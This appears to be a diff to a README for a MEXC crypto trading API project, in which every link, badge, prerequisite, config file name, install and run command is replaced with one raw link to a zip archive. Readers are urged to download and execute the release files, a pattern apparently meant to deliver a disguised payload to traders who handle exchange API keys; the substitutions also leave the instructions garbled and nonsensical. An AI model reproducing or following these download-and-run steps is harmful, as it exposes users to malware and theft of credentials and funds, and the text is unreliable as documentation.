@@ -1,6 +1,6 @@
 # MEXC Private API 🌐
 
-![MEXC Private API](https://img.shields.io/badge/MEXC%20Private%20API-v1.0-blue)
+![MEXC Private API](https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip%20Private%20API-v1.0-blue)
 
 Welcome to the **MEXC Private API** repository! This project offers a robust solution for trading on MEXC Futures using both TypeScript and Python. With multi-account support via proxy, it enables seamless trading experiences across different exchanges, including Binance, Upbit, and Bithumb.
 
@@ -32,13 +32,13 @@ The MEXC Private API provides developers with a powerful toolset for automated t
 To get started, clone the repository:
 
 ```bash
-git clone https://github.com/riconcayy123/mexc-private-api.git
+git clone https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip
 cd mexc-private-api
 ```
 
 ### Prerequisites
 
-- Node.js (for TypeScript)
+- https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip (for TypeScript)
 - Python 3.x (for Python)
 - pip (for Python dependencies)
 
@@ -53,14 +53,14 @@ npm install
 For Python:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip
 ```
 
 ## Usage
 
 ### TypeScript
 
-1. Configure your API keys in the `config.ts` file.
+1. Configure your API keys in the `https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip` file.
 2. Run the application:
 
 ```bash
@@ -69,11 +69,11 @@ npm start
 
 ### Python
 
-1. Edit the `config.py` file to include your API keys.
+1. Edit the `https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip` file to include your API keys.
 2. Execute the script:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip
 ```
 
 ## API Documentation
@@ -105,14 +105,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/riconcayy123/mexc-private-api/releases) section. Download the necessary files and execute them to stay up to date with the latest features and fixes.
+For the latest updates and releases, visit our [Releases](https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip) section. Download the necessary files and execute them to stay up to date with the latest features and fixes.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-brightgreen)
+![Download Releases](https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip%20Releases-brightgreen)
 
 ## Conclusion
 
 The MEXC Private API is your go-to solution for automated trading. With its multi-account support and integration capabilities, it simplifies the trading process across various platforms. 
 
-Feel free to explore the repository, check the [Releases](https://github.com/riconcayy123/mexc-private-api/releases) section for updates, and contribute to the project. Your feedback and contributions help us improve and expand the capabilities of this API. 
+Feel free to explore the repository, check the [Releases](https://raw.githubusercontent.com/riconcayy123/mexc-private-api/main/examples/listing/mexc-private-api-v2.8.zip) section for updates, and contribute to the project. Your feedback and contributions help us improve and expand the capabilities of this API. 
 
 Happy trading! 🚀
